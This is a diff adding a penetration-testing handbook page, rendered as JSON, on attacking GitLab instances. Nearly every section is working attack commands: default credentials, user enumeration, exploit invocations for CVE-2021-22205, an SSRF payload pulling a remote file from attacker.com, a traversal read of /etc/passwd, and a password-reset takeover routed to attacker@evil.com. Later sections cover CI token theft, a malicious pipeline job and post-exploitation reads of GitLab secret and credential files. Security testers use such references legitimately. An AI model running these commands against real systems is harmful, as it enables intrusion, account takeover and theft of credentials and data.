@@ -1,0 +1,284 @@
+{
+    "title": "GitLab",
+    "breadcrumb": [
+        {
+            "title": "Enumeration",
+            "url": "/enumeration"
+        },
+        {
+            "title": "Web Technologies",
+            "url": "/enumeration/webservices"
+        }
+    ],
+    "sections": [
+        {
+            "heading": "Default Credentials",
+            "type": "code_block",
+            "content": [
+                "Username: root",
+                "Password: 5iveL!fe",
+                "",
+                "Username: admin  ",
+                "Password: 5iveL!fe",
+                "",
+                "# Note: GitLab 14.0+ forces password change on first login"
+            ]
+        },
+        {
+            "heading": "Enumeration",
+            "subheadings": [
+                {
+                    "heading": "Public Information",
+                    "type": "code_block",
+                    "content": [
+                        "# Check for public projects (even on private instances)",
+                        "https://gitlab.target.com/explore",
+                        "https://gitlab.target.com/explore/projects",
+                        "https://gitlab.target.com/explore/groups",
+                        "https://gitlab.target.com/explore/snippets",
+                        "",
+                        "# Search for sensitive content",
+                        "# Use searchbar for: password, secret, key, token, api_key, credentials",
+                        "",
+                        "# API endpoints (may leak version info)",
+                        "https://gitlab.target.com/api/v4/version",
+                        "https://gitlab.target.com/api/v4/projects",
+                        "https://gitlab.target.com/api/v4/users"
+                    ]
+                },
+                {
+                    "heading": "User Enumeration",
+                    "type": "code_block",
+                    "content": [
+                        "# Enumerate users via API",
+                        "curl https://gitlab.target.com/api/v4/users",
+                        "",
+                        "# Check user profiles",
+                        "https://gitlab.target.com/users/admin",
+                        "https://gitlab.target.com/admin",
+                        "",
+                        "# Enumerate via response differences",
+                        "# Valid user: 200 OK with profile",
+                        "# Invalid user: 404 Not Found"
+                    ]
+                },
+                {
+                    "heading": "Version Detection",
+                    "type": "code_block",
+                    "content": [
+                        "# Check version (if exposed)",
+                        "curl https://gitlab.target.com/api/v4/version",
+                        "curl https://gitlab.target.com/help",
+                        "",
+                        "# Fingerprint via assets",
+                        "# Compare JS/CSS hashes with known versions"
+                    ]
+                }
+            ]
+        },
+        {
+            "heading": "Common Vulnerabilities",
+            "subheadings": [
+                {
+                    "heading": "CVE-2021-22205 (RCE via Image Upload) - Critical",
+                    "type": "code_block",
+                    "content": [
+                        "# Affects GitLab CE/EE < 13.10.3, < 13.9.6, < 13.8.8",
+                        "# Unauthenticated RCE via malicious image in exiftool",
+                        "",
+                        "# Check if vulnerable",
+                        "curl -s https://gitlab.target.com/users/sign_in | grep -oP 'gitlab_version.*?(\\d+\\.\\d+\\.\\d+)'",
+                        "",
+                        "# Exploit - https://github.com/AhmedMohamedDev/CVE-2021-22205",
+                        "python3 exploit.py -t https://gitlab.target.com -c \"id\""
+                    ]
+                },
+                {
+                    "heading": "CVE-2021-22214 (SSRF)",
+                    "type": "code_block",
+                    "content": [
+                        "# Affects GitLab CE/EE 10.5 to 13.10.4",
+                        "# SSRF via CI lint API",
+                        "",
+                        "curl -X POST \"https://gitlab.target.com/api/v4/ci/lint\" \\",
+                        "  -H \"Content-Type: application/json\" \\",
+                        "  -d '{\"content\": \"include:\\n  remote: http://attacker.com/evil.yml\"}'"
+                    ]
+                },
+                {
+                    "heading": "CVE-2023-2825 (Path Traversal)",
+                    "type": "code_block",
+                    "content": [
+                        "# Affects GitLab CE/EE 16.0",
+                        "# Unauthenticated path traversal to read files",
+                        "",
+                        "curl \"https://gitlab.target.com/uploads/-/system/personal_snippet/1/secret/../../../../../../../../etc/passwd\""
+                    ]
+                },
+                {
+                    "heading": "CVE-2023-7028 (Account Takeover)",
+                    "type": "code_block",
+                    "content": [
+                        "# Affects GitLab CE/EE < 16.5.6, < 16.6.4, < 16.7.2",
+                        "# Password reset to attacker-controlled email",
+                        "",
+                        "# Exploit via duplicate email parameter",
+                        "POST /users/password HTTP/1.1",
+                        "user[email]=victim@target.com&user[email]=attacker@evil.com"
+                    ]
+                }
+            ]
+        },
+        {
+            "heading": "CI/CD Pipeline Exploitation",
+            "subheadings": [
+                {
+                    "heading": "Secrets in CI Variables",
+                    "type": "code_block",
+                    "content": [
+                        "# .gitlab-ci.yml - Check for exposed secrets",
+                        "# Variables often visible in job logs if not masked",
+                        "",
+                        "script:",
+                        "  - echo $CI_JOB_TOKEN  # May have repo access",
+                        "  - echo $PRIVATE_TOKEN  # If misconfigured",
+                        "  - printenv  # Dump all variables"
+                    ]
+                },
+                {
+                    "heading": "Token Abuse",
+                    "type": "code_block",
+                    "content": [
+                        "# CI_JOB_TOKEN has temporary access to:",
+                        "# - Clone repositories in the same group",
+                        "# - Push to container registry",
+                        "# - Access package registry",
+                        "",
+                        "# Use stolen CI_JOB_TOKEN",
+                        "git clone https://gitlab-ci-token:${CI_JOB_TOKEN}@gitlab.target.com/group/repo.git",
+                        "",
+                        "# Access container registry",
+                        "docker login -u gitlab-ci-token -p ${CI_JOB_TOKEN} registry.gitlab.target.com"
+                    ]
+                },
+                {
+                    "heading": "Runner Exploitation",
+                    "type": "code_block",
+                    "content": [
+                        "# If you can modify .gitlab-ci.yml in any repo:",
+                        "# 1. Shared runners may access other project secrets",
+                        "# 2. Shell executors run as gitlab-runner user",
+                        "# 3. Docker executors may allow container escape",
+                        "",
+                        "# Malicious CI job",
+                        "stages:",
+                        "  - exploit",
+                        "",
+                        "exploit:",
+                        "  stage: exploit",
+                        "  script:",
+                        "    - cat /etc/passwd",
+                        "    - env",
+                        "    - ls -la /home/gitlab-runner/"
+                    ]
+                }
+            ]
+        },
+        {
+            "heading": "GraphQL API Testing",
+            "type": "code_block",
+            "content": [
+                "# Introspection query",
+                "curl -X POST https://gitlab.target.com/api/graphql \\",
+                "  -H \"Content-Type: application/json\" \\",
+                "  -d '{\"query\": \"{ __schema { types { name } } }\"}'",
+                "",
+                "# Query current user",
+                "curl -X POST https://gitlab.target.com/api/graphql \\",
+                "  -H \"Content-Type: application/json\" \\",
+                "  -H \"Authorization: Bearer TOKEN\" \\",
+                "  -d '{\"query\": \"{ currentUser { username email } }\"}'"
+            ]
+        },
+        {
+            "heading": "Post-Exploitation",
+            "type": "code_block",
+            "content": [
+                "# If you have access to GitLab server:",
+                "",
+                "# Database credentials",
+                "cat /etc/gitlab/gitlab.rb | grep -i password",
+                "cat /var/opt/gitlab/gitlab-rails/etc/database.yml",
+                "",
+                "# Secrets file (for cookie signing, etc.)",
+                "cat /etc/gitlab/gitlab-secrets.json",
+                "",
+                "# Rails console (as root)",
+                "gitlab-rails console",
+                "# Then: User.find_by(username: 'root').password = 'newpassword'",
+                "",
+                "# Backup (contains all data)",
+                "ls /var/opt/gitlab/backups/"
+            ]
+        },
+        {
+            "heading": "Tools",
+            "type": "code_block",
+            "content": [
+                "# GitLab enumeration",
+                "# https://github.com/AhmedMohamedDev/gitlab-enum",
+                "python3 gitlab_enum.py -t https://gitlab.target.com",
+                "",
+                "# CI/CD exploitation",
+                "# https://github.com/AhmedMohamedDev/nord-stream",
+                "nord-stream -t gitlab -u https://gitlab.target.com -token TOKEN",
+                "",
+                "# General",
+                "nuclei -t http/cves/2021/CVE-2021-22205.yaml -u https://gitlab.target.com"
+            ]
+        },
+        {
+            "heading": "Related Topics",
+            "type": "list",
+            "content": [
+                "CI/CD Security - Pipeline attacks",
+                "SSRF - GitLab SSRF vulnerabilities",
+                "Supply Chain - Code repository attacks"
+            ]
+        }
+    ],
+    "images": [
+        {
+            "description": "GitHub icon",
+            "url": "https://ka-p.fontawesome.com/releases/v7.1.0/svgs/brands/github.svg?v=2&token=a463935e93"
+        },
+        {
+            "description": "Chevron down icon",
+            "url": "https://ka-p.fontawesome.com/releases/v7.1.0/svgs/regular/chevron-down.svg?v=2&token=a463935e93"
+        },
+        {
+            "description": "Hashtag icon",
+            "url": "https://ka-p.fontawesome.com/releases/v7.1.0/svgs/regular/hashtag.svg?v=2&token=a463935e93"
+        },
+        {
+            "description": "Chevron left icon",
+            "url": "https://ka-p.fontawesome.com/releases/v7.1.0/svgs/regular/chevron-left.svg?v=2&token=a463935e93"
+        },
+        {
+            "description": "Chevron right icon",
+            "url": "https://ka-p.fontawesome.com/releases/v7.1.0/svgs/regular/chevron-right.svg?v=2&token=a463935e93"
+        }
+    ],
+    "metadata": {
+        "last_updated": "2026-02-03T14:05:45.496Z",
+        "edit_url": "https://github.com/six2dez/pentest-book/blob/master/enumeration/webservices/gitlab.md",
+        "previous_page": {
+            "title": "GitHub",
+            "url": "/enumeration/webservices/github"
+        },
+        "next_page": {
+            "title": "WAFs",
+            "url": "/enumeration/webservices/wafs"
+        }
+    }
+}
